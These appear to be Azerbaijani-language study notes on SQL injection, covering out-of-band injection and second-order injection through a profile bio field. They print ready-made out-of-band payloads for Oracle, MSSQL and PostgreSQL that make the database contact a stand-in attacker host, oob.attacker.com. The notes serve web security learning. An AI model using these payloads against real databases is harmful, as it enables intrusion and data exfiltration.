## Out-of-Band (OOB) SQL injection

Attacker database-dən datanı oxuyur və database-i məcbur edir ki, o datanı DNS/HTTP sorğusu kimi birbaşa attackerin serverinə göndərsin. Dedect elemek ucun:

Oracle - ' AND UTL_INADDR.get_host_address('oob.attacker.com') IS NOT NULL--

MsSql - '; EXEC master..xp_dirtree '\\oob.attacker.com\test'--

PostgreSql - '; COPY (SELECT 1) TO PROGRAM 'nslookup oob.attacker.com'--

MySQL, SqlLite ve Mongo db default olaraq mümkün deyil.

dedect elemek ucun sqlmap-dan istifade edile biler - https://github.com/sqlmapproject/sqlmap/issues/5516

## Second-based SQL injection

sən SQL payload-u database-ə yazdırırsan o anda heç nə olmur sonradan başqa bir funksiya / admin panel / cron job o datanı istifadə edir onda injection partlayır. Second-order SQL injection payload-un dərhal yox, database-dən sonradan oxunub istifadə edildiyi anda icra olunmasıdır.

<img width="659" height="742" alt="image" src="https://github.com/user-attachments/assets/6ac492a8-ce90-44e6-ac27-8173fc534bad" />

Ine-deki videoda username ve bio hissesi var. Nese yazib update etdikden sonra baxmaq olur. Attacker bio yerine select database() yazir ve user melumatlarina baxdiqda artiq payload icra edilmis olur.
